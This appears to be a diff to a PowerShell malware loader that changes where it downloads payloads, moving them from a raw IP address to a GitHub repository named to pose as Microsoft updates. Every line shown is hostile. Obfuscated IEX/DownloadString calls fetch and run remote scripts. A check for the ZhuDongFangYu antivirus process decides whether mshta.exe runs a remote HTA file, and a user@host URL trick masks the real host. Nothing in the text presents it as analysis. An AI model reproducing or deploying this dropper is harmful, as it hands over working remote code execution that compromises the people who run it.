@@ -1,16 +1,16 @@
-IEX (New-Object System.Net.Webclient)."Downloa`dString"('ht'+'tp://:8080/Update.back')
+IEX (New-Object System.Net.Webclient)."Downloa`dString"('ht'+'tps://raw.githubusercontent.com/MicrosoftUpdate/Update_181115/master/Download')
 			
 $id = Get-Process -name ZhuDongFangYu* | Select-Object id | ForEach-Object -Process{$_.id}
 			
 if($id -eq $null) {
 			
-C:\Windows\SysWOW64\mshta.exe http://10.0.0.1:123@:8080/foo443.hta
+C:\Windows\SysWOW64\mshta.exe https://10.0.0.1:123@min.gitcdn.link/repo/MicrosoftUpdate/Update_181115/master/Patchx86
 
 }
 			
 else{
 			
-IEX (New-Object System.Net.Webclient)."Downloa`dString"('ht'+'tp://47.52.61.250:8080/test.ps1')
+IEX (New-Object System.Net.Webclient)."Downloa`dString"('ht'+'tps://raw.githubusercontent.com/MicrosoftUpdate/Update_181115/master/GetSession')
 	
 }
 
